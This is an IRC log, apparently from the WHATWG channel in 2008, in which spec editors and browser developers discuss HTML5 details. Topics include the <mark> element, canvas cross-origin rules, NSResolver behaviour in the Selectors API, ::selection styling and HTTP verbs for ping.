"I also have some <mark>kitten</mark>s" - that makes me wonder whether "<mark>kittens</mark>" would be acceptable (from a cleverer search engine that detects words with the same basic meaning, rather than doing substring matches, and it might get <mark>young cat</mark> too)

[16:23:00.0000] <Philip`>
(I believe it is perfectly acceptable, but the example makes me wonder anyway, so maybe the example could say <mark>kittens</mark> to be clear that it's not meant to be strict about anything)

[16:23:01.0000] <webben>
it's intriguing folks aren't sure CITE is 100% semantically appropriate for citations in zotero's output: http://forums.zotero.org/discussion/2169/

[16:24:00.0000] <webben>
http://en.wikipedia.org/wiki/Template_talk:Citation also interesting

[16:25:00.0000] <Philip`>
"<pre><code>int x = 1<mark></mark></code></pre> Error: expected semicolon; got EOF" - I guess that wouldn't work, which seems a problem if you want to use this for highlighting sections of code

[16:28:00.0000] <Philip`>
Is it safe to copy xkcd text without being affected by Creative Commons?

[01:59:00.0000] <annevk>
jwalden, the security section already deals with cross-origin stuff

[01:59:01.0000] <annevk>
jwalden, also for setting fillStyle and strokeStyle

[02:01:00.0000] <jwalden>
sure; it doesn't, however, say that drawImage with a different-origin image should not throw

[02:02:00.0000] <Philip`>
Is it not possible to access the .complete of a different-origin image?

[02:03:00.0000] <annevk>
jwalden, it does

[02:04:00.0000] <jwalden>
where?

[02:04:01.0000] <annevk>
http://www.whatwg.org/specs/web-apps/current-work/multipage/section-the-canvas.html#security1

[02:05:00.0000] <jwalden>
that just says origin-clean is set to false, not that it doesn't throw

[02:05:01.0000] <annevk>
oh right, sorry

[02:05:02.0000] <annevk>
why should drawing fail?

[02:05:03.0000] <annevk>
there's no risk there

[02:07:00.0000] <jwalden>
it can draw or not draw depending on whether the resource is a valid image, it just seems reasonable to say you shouldn't be able to differentiate the two for a different-origin image

[02:07:01.0000] <jwalden>
.complete doesn't say anything about origins

[02:07:02.0000] <jwalden>
which might make the concern moot, now that you mention it

[02:07:03.0000] <annevk>
onerror fails for non same-origin images too

[02:07:04.0000] <annevk>
euh, fires

[02:07:05.0000] <annevk>
s/fails/fires/

[02:09:00.0000] <jwalden>
hrm

[02:09:01.0000] <jwalden>
so basically, worrying about this is probably not worthwhile, I guess

[02:10:00.0000] <annevk>
yeah

[02:11:00.0000] <annevk>
certainly <canvas> wouldn't be the place to fix the issue

[06:25:00.0000] <annevk>
for 'setAttribute(a, v1); v2 = getAttribute(a)' v1 != v2 when a is style in Gecko (for some values of v1)

[06:26:00.0000] <annevk>
oops

[06:36:00.0000] <hendry>
anyone going to www2008.org in Beijing? i need some motivation

[06:37:00.0000] <annevk>
my manager prolly

[06:38:00.0000] <annevk>
aka chaals

[06:38:01.0000] <Lachy>
annevk, do you know if comments like this one, which don't require any action, need to be recorded in the disposition of comments? http://lists.w3.org/Archives/Public/public-webapi/2008Jan/0021.html

[06:39:00.0000] <annevk>
explicit endorsement is never bad, i'd add it

[06:41:00.0000] <Lachy>
done

[06:48:00.0000] <Lachy>
I wonder how I can deal with this comment http://lists.w3.org/Archives/Public/public-webapi/2008Feb/0104.html

[06:49:00.0000] <Lachy>
I don't know what the spec should say about the issue

[06:49:01.0000] <Lachy>
of NSResolver mutating the DOM

[06:51:00.0000] <Lachy>
I wonder if I could say that, due to the possibility of the NSResolver mutating the DOM, that all prefixes must be resolved before looking for matching elements

[06:52:00.0000] <Lachy>
that way, if NSResolver did modify the dom, then all modifications would have occurred before the UA began looking

[06:55:00.0000] <annevk>
"

[06:55:01.0000] <annevk>
Now maybe you're actually requiring that the number of calls to the NSResolver 

[06:55:02.0000] <annevk>
for any given selector and initial DOM tree is bounded in the face of all 

[06:55:03.0000] <annevk>
possible mutations by the NSResolver and that hence the DOM will at some point 

[06:55:04.0000] <annevk>
stabilize and it will be possible to return the things the spec requires be 

[06:55:05.0000] <annevk>
returned.  But if that's a constraint you want to place on implementations, you 

[06:55:06.0000] <annevk>
should probably spell it out clearly."

[06:55:07.0000] <annevk>
is what I think the spec already says

[06:55:08.0000] <annevk>
but we could add a paragraph that spells it out clearly

[06:55:09.0000] <hendry>
annevk: met charges at MWC2008 in Barcelona, aka HELL

[06:55:10.0000] <annevk>
Lachy, indeed

[07:03:00.0000] <Philip`>
Lachy: s/exersise/exercise/ in the note about case-mapping

[07:04:00.0000] <Lachy>
fixed

[07:21:00.0000] <Lachy>
annevk, how does this sound:

[07:21:01.0000] <Lachy>
Elements returned by these methods must include only matching Element nodes, which were present in the document after all namespaces that the implemented needed to resolve, have been resolved.

[07:21:02.0000] <Lachy>
Note: This is to ensure that any DOM modifications performed by a misbehaving namespace resolver have occurred prior to matching any elements.

[07:21:03.0000] <Lachy>
s/implemented/implementation/

[07:23:00.0000] <Philip`>
The first sentence doesn't sound right - if someone queried for "a b" then the resolver moved the 'b' outside the 'a' (but kept it present in the document elsewhere), it's not clear that it shouldn't be matched

[07:24:00.0000] <hendry>
s/charges/chaals/ woops

[07:26:00.0000] <Lachy>
Philip`, then it would no longer be a matching element node

[07:28:00.0000] <Lachy>
I'm not sure how I can make it any clearer. Elements are only determined to match at the they are evaluated with the selector

[07:28:01.0000] <Philip`>
It was a matching element node (before the resolving), so it is one of the matching nodes which is still present in the document

[07:28:02.0000] <Lachy>
but the implementation wouldn't know that it was matching until it started looking for it

[07:28:03.0000] <Philip`>
*still present in the document after the resolving

[07:32:00.0000] <Lachy>
hmm. I just realised my current defintions of element.querySelector require the matching elements to be within the document, but that wouldn't be the case if the element itself wasn't in the document

[07:33:00.0000] <Lachy>
oh, no they don't

[07:33:01.0000] <Lachy>
I misread it

[07:34:00.0000] <Philip`>
"'Matching Element nodes' are the Element nodes that match after all NSResolver calls have been made" or something like that?

[07:35:00.0000] <Philip`>
Incidentally, "The implementation must process the selectors according to the grammar of Selectors ([Selectors], section 10)." should have small-caps "must"

[07:35:01.0000] <Philip`>
(as should "the implementation must act as if the nsresolver argument was set to null")

[07:46:00.0000] <Lachy>
fixed

[07:47:00.0000] <annevk>
Lachy, I'm away for a while, just check in what you think is appropriate, i'll try to scream whenever it's not :p

[07:50:00.0000] <Lachy>
Elements returned by these methods must include only Element nodes that are present within the document or the element’s subtree that match the group of selectors after all namespaces that need to be resolved by the implementation, have been resolved.

[07:51:00.0000] <Lachy>
Philip`, how's that now?

[07:51:01.0000] <Lachy>
s/subtree that/subtree and/

[07:52:00.0000] <Lachy>
this is the corrected version:

[07:52:01.0000] <Lachy>
Elements returned by these methods must only include Element nodes that are present within the document or the element’s subtree, and match the group of selectors after all namespaces that need to be resolved by the implementation, have been resolved.

[07:55:00.0000] <jgraham_mibbit>
Lachy: I think your commas are in the wrong places

[07:56:00.0000] <jgraham_mibbit>
Actually I just think that the last comma is wrong

[07:56:01.0000] <jgraham_mibbit>
(i.e. you should delete it)

[07:57:00.0000] <Lachy>
ok

[08:04:00.0000] <Lachy>
hmm. I need to think about this some more. I'm not sure if it completely addresses Boris' comment

[08:07:00.0000] <Philip`>
Lachy: Sounds reasonable to me now

[08:19:00.0000] <zcorpan>
should the presence of a ::selection rule set supress the default styles for selections?

[08:20:00.0000] <zcorpan>
s/rule/ruleset/

[08:21:00.0000] <othermaciej>
zcorpan: I think it's browser-specific how they combine

[08:25:00.0000] <zcorpan>
/me thinks it should be defined

[08:34:00.0000] <othermaciej>
zcorpan: the expected model would be different if the default selection style is something that can be itself achieved through style rule vs. if it is a totally custom rendering of some kind

[08:35:00.0000] <Philip`>
::selected { display: none } /* Anti-Copy-And-Paste Script, copyright 2008 www.coolscripts.com */

[08:36:00.0000] <zcorpan>
currently both opera and firefox supress default styles in the presence of ::selection (or ::-moz-selection)

[08:36:01.0000] <zcorpan>
Philip`: display doesn't apply

[08:36:02.0000] <Philip`>
Oh

[08:36:03.0000] <zcorpan>
Philip`: or it's not required to apply

[08:36:04.0000] <othermaciej>
the selection pseudo-element allows a limited set of style properties

[08:37:00.0000] <othermaciej>
in Safari, I think the background drawing still happens unless you explicitly suppress it

[08:37:01.0000] <Philip`>
::selected { color: expression(alert("Anti-Copy-And-Paste!")) }

[08:38:00.0000] <zcorpan>
supressing the default styles is different from how css usually works, so not what i had expected

[08:40:00.0000] <zcorpan>
oh wait, opera doesn't supress unless there's a color or background property, it seems

[08:43:00.0000] <othermaciej>
Safari models it as a magical background-color property basically, although there isn't an explicit rule for it in html4.css

[08:44:00.0000] <hsivonen>
othermaciej: does Apple disclose the mechanism of Safari content blocking when parental controls are enabled?

[08:45:00.0000] <othermaciej>
hsivonen: I'm not sure

[08:45:01.0000] <hsivonen>
othermaciej: ok

[08:45:02.0000] <othermaciej>
hsivonen: I believe the parent can set up a whitelist via bookmarks, but I don't know if there is more to it

[08:47:00.0000] <hsivonen>
othermaciej: there seems to be a middle setting where magic is supposed to happen in addition to parent-controlled white and blacklists

[08:47:01.0000] <hsivonen>
othermaciej: unlike IE, Safari doesn't say what the magic is

[10:47:00.0000] <zcorpan>
http://forums.whatwg.org/viewtopic.php?t=151

[11:06:00.0000] <Lachy>
I don't think introducing even more entities is a good idea

[11:17:00.0000] <h3h>
so I'm trying to come up with the most reasonable/portable way to represent this data as HTML: http://h3h.net/images/data-representation-01.png

[11:18:00.0000] <h3h>
I think a DL matches somewhat, so this would be good: http://pastie.caboo.se/153841

[11:18:01.0000] <h3h>
but I can't think of a way to style that reliably

[11:19:00.0000] <jwalden>
if you care about portability, I think you lose; I'm not sure how you'd work with that other than with ~ or + selectors

[11:19:01.0000] <h3h>
right. even then, separating the dt/dd+ blocks from one another is near impossible

[11:19:02.0000] <h3h>
so I guess each data block has to be its own table or dl

[11:20:00.0000] <h3h>
supremely disappointing

[11:21:00.0000] <jwalden>
<div><h3>Members</h3><div>stuff [<br /> more stuff]</div></div> or something

[11:21:01.0000] <h3h>
yeah, but then I have the same sibling grouping problem

[11:22:00.0000] <Lachy>
h3h, looks like a job for nested tables :-)

[11:22:01.0000] <h3h>
tables really don't work because they assume a specific row/column layout

[11:22:02.0000] <jwalden>
.outer > .inner { } .outer > .header { } ?

[11:22:03.0000] <h3h>
in this case I just have header:data groupings

[11:22:04.0000] <h3h>
which could be displayed vertically, horizontally, or otherwise

[11:23:00.0000] <Lachy>
then dl/dt/dd might be appropriate, though may be difficult to achieve the intended style

[11:23:01.0000] <h3h>
so it would have to be more like <div class="stats"><div class="stat"><h3>Header</h3><p>data</p></div> <div class="stat"><h3>Header 2</h3><p>data 2</p></div> ...</div>

[11:23:02.0000] <h3h>
which is disgusting, frankly

[11:24:00.0000] <h3h>
yeah, I think I'm going to have to go with a new DL for each one

[11:24:01.0000] <jwalden>
it's web development :-)

[11:24:02.0000] <h3h>
less terrible than the alternatives

[11:25:00.0000] <h3h>
it's like I want the semantics of a "table row" (which can contain a header and one or more data elements) without the notion of an actual row

[11:26:00.0000] <h3h>
the simplest table markup would be perfect if I could style it vertically

[11:27:00.0000] <h3h>
table-layout: transposed; or something :)

[11:30:00.0000] <h3h>
actually, I might be able to pull that off...

[11:40:00.0000] <h3h>
hah: http://paste.css-standards.org/32610/view

[11:40:01.0000] <h3h>
though it displays upside down in Safari

[11:42:00.0000] <h3h>
and sideways in IE

[11:42:01.0000] <h3h>
Firefox and Opera get the prize for simplest reverse engineering of default styles

[11:56:00.0000] <SadEagle>
h3h: try making it strict

[11:56:01.0000] <h3h>
hm good point

[11:57:00.0000] <h3h>
ah nice shooting. works fine with strict

[11:58:00.0000] <h3h>
in Safari

[11:58:01.0000] <h3h>
IE still sucks of course

[11:58:02.0000] <Dashiva>
Would you have it any other way?

[11:58:03.0000] <h3h>
:(

[12:23:00.0000] <Hixie>
othermaciej lives!

[12:23:01.0000] <othermaciej>
hello Hixie 

[12:23:02.0000] <othermaciej>
I've been on vacation the past week

[12:23:03.0000] <othermaciej>
back now

[12:23:04.0000] <Hixie>
so i heard

[12:24:00.0000] <Hixie>
you might be interested in http://hixie.ch/specs/dom/messages/0.9 and http://hixie.ch/specs/dom/workers/0.9

[12:24:01.0000] <Hixie>
once you've dealt with your e-mail

[12:24:02.0000] <jruderman>
Hixie: are you serious about "The eyes go orange if you view the test zoomed in or zoomed out: This is a bug."?

[12:24:03.0000] <jruderman>
see https://bugzilla.mozilla.org/show_bug.cgi?id=418235#c6

[12:25:00.0000] <jruderman>
expecting that transparency offset thing to work when zoomed seems a bit much

[12:29:00.0000] <roc>
so Hixie's saying that image scaling algorithms that use any kind of interpolation are not allowed?

[12:31:00.0000] <Hixie>
it's certainly suboptimal

[12:32:00.0000] <Hixie>
one could imagine a perfect UA that rendered all the graphics at 1:1, then scaled the composited graphic down

[12:32:01.0000] <Hixie>
and then overlapped the text on top of that

[12:32:02.0000] <Hixie>
i'm not saying that's necessarily even remotely easy or likely to ever be implemented

[12:33:00.0000] <roc>
actually that is feasible, it's full-screen antialiasing

[12:33:01.0000] <roc>
but it

[12:33:02.0000] <roc>
's expensive

[12:33:03.0000] <Hixie>
i'm sure

[12:34:00.0000] <Hixie>
but it's hard to argue that it's not what is intended by the author :-)

[12:34:01.0000] <jruderman>
hopefully this issue doesn't come up much in real-world web pages :)

[12:34:02.0000] <Hixie>
probably comes up more than you'd like, and less than makes it worth it :-)

[12:35:00.0000] <roc>
well, in this case we might wilfully ignore the author's intent since interpolation produces good results for real Web pages

[12:35:01.0000] <roc>
as in, I haven't seen a real bug filed related to this

[12:36:00.0000] <Hixie>
well we haven't shipped zoom yet :-)

[12:37:00.0000] <roc>
true, and IIRC only Mac builds use interpolation

[12:37:01.0000] <roc>
but still, there are something like 300K active beta3 users

[12:39:00.0000] <Hixie>
rue

[12:39:01.0000] <Hixie>
true

[12:41:00.0000] <Hixie>
like i said, i doubt that it's worth fixing

[12:41:01.0000] <Hixie>
bbl

[13:54:00.0000] <hsivonen>
hmm. now internationalization and accessibility & ethics are at odds: http://lists.w3.org/Archives/Public/www-archive/2008Feb/0030.html

[13:56:00.0000] <annevk>
i've given up reading through his replies

[13:58:00.0000] <annevk>
/me wonders how fast his note about <object> will cause a stirr

[13:59:00.0000] <Dashiva>
/me wonders if annevk did it on purpose

[13:59:01.0000] <annevk>
well, I did want to point out that his point of view has caused issues in the past, but I didn't want to say too much

[14:00:00.0000] <annevk>
I think it's rather well put, but probably only if you agree with my line of thought

[14:03:00.0000] <hsivonen>
annevk: well, gotta love a situation where one way leads to getting accused of breaking accessibility and the other would lead to accusations of breaking internationalization

[14:05:00.0000] <annevk>
It's hard for me to see what his real issue is. That some browsers are still broken?

[14:06:00.0000] <hsivonen>
annevk: so I gather from his feedback

[14:06:01.0000] <annevk>
ok, so I did read the important parts

[14:06:02.0000] <hsivonen>
of course, it is well-known that there are older versions of IE still out there that don't support IDN

[14:06:03.0000] <hsivonen>
but IE7 supports IDN, right?

[14:06:04.0000] <annevk>
guess first sentence/last sentence, first paragraph/last paragraph, might be applicable to e-mail too

[14:06:05.0000] <annevk>
hsivonen, yeah

[14:07:00.0000] <annevk>
they also experimented with IDN for e-mail I believe

[14:07:01.0000] <jgraham>
annevk: I think you're probably right about aria-* and <object>, at least from the pov of author confusion. I can't imagine any spec that forces us to deal with <label for="a">foo</label> <span id="b">bar</span> <input id="a" aria-labelledby="b"> is going to be easy for authors to understand

[14:08:00.0000] <annevk>
"well, if the OBJECT model failed, it was due to lousy implementation decisions"

[14:08:01.0000] <Dashiva>
Ouch: "Some weeks ago you quoted an ISO standard I haven't heard of before for your definition of "valid".  If that ISO standard has "congruent de facto guidance" in its definition trash it or maybe put it where you have DIS 29500."

[14:08:02.0000] <hsivonen>
jgraham: I happen to have a use case for having an input labeled by a <select> :-)

[14:08:03.0000] <annevk>
score

[14:09:00.0000] <hsivonen>
jgraham: and <label> doesn't work due to the association by containment legacy misfeature 

[14:09:01.0000] <annevk>
it's questionable whether you should use <select> there though or three separate forms

[14:10:00.0000] <annevk>
i guess both approaches are ok somehow

[14:11:00.0000] <jgraham>
hsivonen: I don't think all the features are bad, just that making it all easy to understand will be tough

[14:12:00.0000] <annevk>
pretty clear that HD DVD is dead now

[14:12:01.0000] <annevk>
glad I didn't buy this Xbox add-on

[14:42:00.0000] <aroben>
hsivonen: do I remember hearing that you have some doctype parsing tests?


2008-02-19
[22:30:00.0000] <Hixie>
man, people have go to start realising that when an implementor says he's not doing something, arguing with him is a bad idea

[22:54:00.0000] <aroben>
Hixie: do you know of any doctype parsing tests?

[23:55:00.0000] <Lachy>
Hixie, which issue are you referring to, and who's arguing with them?

[23:56:00.0000] <annevk>
appformats list

[23:56:01.0000] <annevk>
or maybe webapi

[23:59:00.0000] <Lachy>
haven't read appformats in a while, not too sure what's going on there

[00:01:00.0000] <annevk>
wow, another ala on version targeting

[00:01:01.0000] <Lachy>
I uploaded my disposistion of comments last night http://dev.w3.org/2006/webapi/selectors-api/disposition-of-comments

[00:01:02.0000] <krijnh>
Yeah :/

[00:03:00.0000] <annevk>
oh well, ala hasn't been interesting for a long time now

[00:03:01.0000] <hsivonen>
aroben: I'm known to have http://hsivonen.iki.fi/doctype/ but not test cases for parsing broken doctypes

[00:03:02.0000] <aroben>
hsivonen: ah, thanks

[00:04:00.0000] <annevk>
I think html5lib might have some

[00:04:01.0000] <Lachy>
hmm. I still never wrote anything about the version thingy this time round. maybe I should, if this ALA article says nothing but misinformation about it (again)

[00:05:00.0000] <aroben>
annevk: will look

[00:05:01.0000] <annevk>
aroben, http://html5lib.googlecode.com/svn/trunk/testdata/tokenizer/test3.test

[00:05:02.0000] <annevk>
http://html5lib.googlecode.com/svn/trunk/testdata/tokenizer/test2.test

[00:06:00.0000] <annevk>
http://html5lib.googlecode.com/svn/trunk/testdata/tokenizer/test4.test

[00:06:01.0000] <annevk>
http://html5lib.googlecode.com/svn/trunk/testdata/tokenizer/test1.test

[00:06:02.0000] <annevk>
unfortunately not grouped

[00:06:03.0000] <aroben>
annevk: still very helpful

[00:10:00.0000] <hsivonen>
annevk: are the html5lib tests up to date with the recent change regarding '>'?

[00:10:01.0000] <annevk>
no :(

[00:15:00.0000] <annevk>
at least, not as far as I know

[00:17:00.0000] <annevk>
actually, yes, the tests are up to date thanks to Philip` it seems

[00:28:00.0000] <krijnh>
annevk: no new stuff in the new ALA

[00:29:00.0000] <annevk>
boring

[00:30:00.0000] <annevk>
can someone tell me the result of http://tc.labs.opera.com/css/namespaces/ 002 and 003 in Safari?

[00:31:00.0000] <aroben>
annevk: in a recent nightly both of them have a green background

[00:32:00.0000] <annevk>
thanks

[00:32:01.0000] <krijnh>
In 3.0.4 as well

[00:32:02.0000] <annevk>
does Safari pass 001?

[00:32:03.0000] <krijnh>
Yes

[00:52:00.0000] <Lachy>
I don't really understand Boris' last comment: "but it wouldn't address the issue of what implementations are allowed to actually do to stop misbehaving NSResolvers"

[00:53:00.0000] <annevk>
yeah, what's a misbehaving nsresolver?

[00:53:01.0000] <annevk>
i mean, you could of course do all kinds of quirky things in script, but that's not restricted to NSResolver

[00:53:02.0000] <Lachy>
how does resolving all namespaces prior to traversing the DOM, thus letting the NSResolver do anything it likes beforehand, get in the way of actually finding matches afterwards? 

[00:54:00.0000] <Lachy>
/me will respond

[01:00:00.0000] <krijnh>
"Invited Expert will participate in the W3C Group in a decent way."

[01:04:00.0000] <krijnh>
A year by already

[01:08:00.0000] <annevk>
oh

[01:08:01.0000] <annevk>
/me thought the HTML WG started in March

[01:09:00.0000] <krijnh>
A year minus 1 month then :)

[01:09:01.0000] <krijnh>
Have to reinvite myself as an expert..

[01:11:00.0000] <annevk>
i wonder how many people won't do that

[01:13:00.0000] <krijnh>
I think you get bugged with a mail each week, until you say yes or no

[01:14:00.0000] <krijnh>
Pretty irritating, so saying "yes, I'm still teh expert you need!11" does the trick :)

[01:15:00.0000] <hsivonen>
krijnh: do (public) Invited Experts have to renew their participation annually or what is this about?

[01:15:01.0000] <krijnh>
Yeah, I guess so

[01:15:02.0000] <krijnh>
And there's a new EULA or something

[01:16:00.0000] <hsivonen>
krijnh: what's the diff in the "EULA"?

[01:16:01.0000] <krijnh>
http://www.w3.org/Consortium/Legal/2007/06-invited-expert.html

[01:16:02.0000] <krijnh>
No idea, I'm not an invited expert on EULAs :p

[01:17:00.0000] <krijnh>
Prolly just a clarification for the 2002 version

[01:17:01.0000] <krijnh>
With new elements and a new API

[01:18:00.0000] <krijnh>
Can't they just create a new group for this? Invited Wannabe Experts or something..

[01:18:01.0000] <hsivonen>
hmm. I don't like it that the W3C wants to use copyright to prevent spec branching

[01:20:00.0000] <annevk>
me neither

[01:20:01.0000] <annevk>
or for test suite branching for that matter

[01:20:02.0000] <annevk>
it's silly

[01:20:03.0000] <hsivonen>
the freedom to fork a Free Software project is an important deterrent against the main project going crazy

[01:20:04.0000] <hsivonen>
should be likewise for specs

[01:21:00.0000] <Lachy>
I'm glad that's the case for the WHATWG's HTML5 spec

[01:21:01.0000] <annevk>
maybe they realize they're going crazy in some twisted way

[01:43:00.0000] <Lachy>
Hixie, how do you suggest resolving the hostile-NSResovler issue, if Anne's suggestion is no good?

[01:49:00.0000] <hsivonen>
Lachy: I'm not Hixie, but it seems to me that the way to deal with NSResolver side effects in an interoperable way is to spec when exactly NSResolver is called into

[01:50:00.0000] <annevk>
no, we don't want to go there

[01:51:00.0000] <annevk>
that would not allow optimizations

[01:51:01.0000] <hsivonen>
hmm. how about requiring the script to push a mapping hash table to the browser ahead of time so that no NSResolver is needed?

[01:51:02.0000] <annevk>
*[foo|x]:not([foo|x]) for instance

[01:52:00.0000] <hsivonen>
annevk: you could put the optimization into the spec itself

[01:52:01.0000] <Lachy>
that's difficult

[01:52:02.0000] <Lachy>
what if someone finds an even better optimisation later, and the spec would then prevent them from implementing it

[01:53:00.0000] <annevk>
it would constrain implementations and makes it harder to introduce new selectors

[01:53:01.0000] <hsivonen>
is there a reason why prefix resolution needs to be dynamic instead of a static mapping that is given the the browser at the time of the API call?

[01:54:00.0000] <Lachy>
hsivonen, I think it was because the resolver was based upon the design of the XPathNSResolver

[01:55:00.0000] <hsivonen>
annevk: would implementation be constrained too much if implementation were required to

[01:55:01.0000] <hsivonen>
1) parse the selector

[01:55:02.0000] <Lachy>
crap. meeting time :-(

[01:55:03.0000] <hsivonen>
2) resolve each prefix from left to right exactly once

[01:55:04.0000] <hsivonen>
3) run the selector

[01:55:05.0000] <hsivonen>
?

[01:56:00.0000] <annevk>
for the case I gave above you don't need to resolve the prefix in theory

[01:56:01.0000] <hsivonen>
annevk: ah right. but are such pathological edge cases worth optimizing

[01:57:00.0000] <hsivonen>
annevk: they don't serve a useful purpose for authors

[01:57:01.0000] <annevk>
people say yes

[01:57:02.0000] <annevk>
i'm not sure

[01:57:03.0000] <annevk>
(people being bjoern and hixie, so maybe...)

[01:57:04.0000] <Philip`>
:somenewfeature(foo|x) /* CSS4 browsers need to resolve this prefix, but CSS3 browsers can't know they're meant to */

[01:57:05.0000] <annevk>
that would not parse Philip`

[01:58:00.0000] <annevk>
and throw a SYNTAX_ERR

[01:58:01.0000] <Philip`>
Ah

[02:02:00.0000] <hsivonen>
as far as I can tell, this problem is mostly the same problem that was pointed out when Dave Raggett's XForms Transitional was discussed.

[02:03:00.0000] <hsivonen>
and really the way to make sure that the side effects are the same in all browsers is to clamp down what the calls to the code with the potential side effects are

[02:03:01.0000] <annevk>
no

[02:04:00.0000] <hsivonen>
no?

[02:04:01.0000] <annevk>
the issues is not about all browsers doing the same

[02:04:02.0000] <annevk>
it doesn't have to be fully deterministic

[02:04:03.0000] <hsivonen>
oh. what is it then?

[02:04:04.0000] <annevk>
the issue is more what to do in the case that the authors makes a NSResolver that halts the browser in some way

[02:05:00.0000] <hsivonen>
how has that issue been solved for treewalker node filters?

[02:05:01.0000] <annevk>
i don't think it has been

[02:06:00.0000] <Dashiva>
Well, how would halting the browser in a NSResolver be any different from halting the browser otherwise?

[02:06:01.0000] <hsivonen>
Gecko running scripts in the UI thread is an issue

[02:06:02.0000] <Lachy>
for the case of a hanging NSResolver, I assumed that would be dealt with the same way all hanging scripts in the browser, by eventually timing out and halting execution completely

[02:07:00.0000] <hsivonen>
bad scripts would be less harmful if each browsing context ran its layout and scripts on a private thread

[02:08:00.0000] <annevk>
you don't need threading for that

[02:09:00.0000] <Philip`>
/me wonders what happens if you use "yield" in an NSResolver

[02:09:01.0000] <hsivonen>
annevk: without threading you need code to reach a timeout checkpoint often enough

[02:09:02.0000] <Lachy>
what does yield do?

[02:10:00.0000] <Philip`>
Oh, actually, I suppose it wouldn't do anything very interesting at all

[02:10:01.0000] <Dashiva>
It returns, but preserves internal state for the next call

[02:10:02.0000] <Philip`>
Lachy: http://developer.mozilla.org/en/docs/New_in_JavaScript_1.7#Generators_and_iterators

[02:13:00.0000] <Philip`>
I was thinking of something that preserves more than one stack frame, but that doesn't exist in JS so that's okay

[02:13:01.0000] <annevk>
hsivonen, code gets icky, yeah

[02:17:00.0000] <Philip`>
Even if you run code in separate threads, you need a way to cleanly terminate a thread when the user's bored with it sitting at 100% CPU, which makes code a bit icky too

[02:18:00.0000] <Philip`>
Except actually that's maybe only a tiny bit and you wouldn't even notice it

[02:24:00.0000] <hsivonen>
Philip`: well, yeah, you'd need a mechanism that makes sure that the killed thread isn't holding any monitors/semaphores/etc. that would be left in an inconsistent state

[02:24:01.0000] <annevk>
grmbl, my "we can't" argument is a real argument why we can't do </br> magic, but the overall reason is of course that it's silly and would be quite difficult, performance hit, etc.

[02:25:00.0000] <hsivonen>
Philip`: which isn't exactly trivial unless there are only a couple well-defined places where locking can happen

[02:26:00.0000] <hsivonen>
(BTW, this is the reason I haven't implemented Hixie's suggestion to limit the time a validation transaction is allowed to take instead of limiting the number of bytes Validator.nu is willing to ingest)

[02:46:00.0000] <Lachy>
Hmm. Jonas' suggestion to mention the hanging nsresolver case in the security section is a good idea... Oh, wait. It already is!

[04:17:00.0000] <hsivonen>
fwiw, in case anyone cares about arguing against a new HTTP verb for the ping feature: AJP 1.3 seems to assume a closed list of HTTP verbs, so minting a new one would have a non-trivial cost

[04:19:00.0000] <Lachy>
what's AJP?

[04:20:00.0000] <hsivonen>
Lachy: it's a protocol that Apache speaks with Java servlet containers

[04:21:00.0000] <Lachy>
ok, so it's something that would potentially be used on a server for dealing with pings.

[04:22:00.0000] <Lachy>
however, if you consider that adding a new HTTP verb can't be that much effort, and that any system to be set up for handling pings in the future could easily upgrade. It doesn't require all servers to be upgraded.

[04:22:01.0000] <Lachy>
the bigger problem with ping is getting client support

[04:23:00.0000] <hsivonen>
Lachy: unless I'm misreading the source of an AJP 1.3 implementation, it seems to me that AJP 1.3 communicates the HTTP verb as a single byte whose meaning has to be agreed to by both ends of the AJP pipe

[04:23:01.0000] <Lachy>
oh, in that case, it might be a little more difficult

[04:24:00.0000] <Philip`>
It just needs a single centralised service which understands the PING requests, and then every web developer can make use of that service to collect data and to retrieve summaries and reports

[04:24:01.0000] <hsivonen>
Lachy: I'm not saying it is good design. I'm just saying that there's a common deployment setup with which going beyond the WebDAV set of verbs is going to be expensive

[04:24:02.0000] <Philip`>
It's pointless for people to run the ping-processing software on their own servers

[04:27:00.0000] <Lachy>
Philip`, I don't think it's entirely pointless, but having a single centralised service might work for some system

[04:28:00.0000] <Lachy>
e.g. google analytics, which currently uses JS to notify the google server of certain events, could make use of ping in that way

[04:30:00.0000] <hsivonen>
http://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html#method

[04:31:00.0000] <annevk>
given that webdav is still expanding i assume they'll eventually reconsider their api

[04:31:01.0000] <hsivonen>
note that is says "Later version of ajp13, when used with mod_jk2, will transport additional methods, even if they are not in this list." but mod_jk2 is dead and mod_jk is what people are supposed to be using again

[04:33:00.0000] <hsivonen>
annevk: perhaps. I'm just pointing out that considering the requirements Hixie had for the access-control implementability, a new HTTP verb is on a new level of difficulty

[04:34:00.0000] <hsivonen>
fwiw, the mechanism for encoding headers in AJP13 (I guess it's really 13 and not 1.3) is extensible

[04:34:01.0000] <hsivonen>
I think the failure to use the same mechanism for the verb is a design bug, but software has shipped

[05:25:00.0000] <annevk>
when do we get the ALA article about version targeting being all wrong?

[05:25:01.0000] <annevk>
or is it supposed to be one-sided?

[05:30:00.0000] <itpastorn>
How would you go about changing jeffrey Z's mind?

[05:31:00.0000] <Philip`>
annevk: http://www.alistapart.com/articles/theyshootbrowsers sounds non-positive about it

[05:32:00.0000] <annevk>
itpastorn, i'd put him on the QA team of non-IE browser for a year or two

[05:32:01.0000] <annevk>
Philip`, I was going by the summary on zeldman.com

[05:32:02.0000] <Philip`>
itpastorn: Hypnosis

[05:32:03.0000] <Philip`>
(since that requires less effort than thinking of logical arguments)

[05:37:00.0000] <itpastorn>
OK, so maybe we will get JZ and Eric Meyer to change their minds. Now, how would we get the MSIE team onboard? I seriously can't think of any way to change their minds.

[05:38:00.0000] <itpastorn>
As I see it now it is an issue of damage control

[05:38:01.0000] <Philip`>
Change their minds before releasing IE8?

[05:39:00.0000] <Philip`>
(Perhaps it's more possible to make their IE8 experience cause them to reconsider for IE9)

[05:39:01.0000] <Philip`>
((like how IE7 made them reconsider IE8))

[05:40:00.0000] <itpastorn>
Yes, the ball-and-chain effect of supporting multiple rendering modes will sooner or later take its toll

[06:27:00.0000] <hsivonen>
annevk: presumable setting a header ahead of GET could be specified to trigger pre-flight?

[06:27:01.0000] <hsivonen>
s/ble/bly/

[06:39:00.0000] <annevk>
hsivonen, that's quite a neat idea

[06:52:00.0000] <annevk>
hsivonen, I put it on the list

[07:17:00.0000] <zcorpan>
annevk: do you know if there are any test cases for cssom .styleSheets in combination with @import?

[07:18:00.0000] <annevk>
i thought .styleSheets was not supposed to be populated with that

[07:21:00.0000] <annevk>
zcorpan, I don't really understand what you're asking for

[07:23:00.0000] <zcorpan>
sorry, i meant .styleSheet (on CSSImportRule)

[07:24:00.0000] <annevk>
no, feel free to add to http://tc.labs.opera.com/apis/cssom/

[07:24:01.0000] <zcorpan>
ok

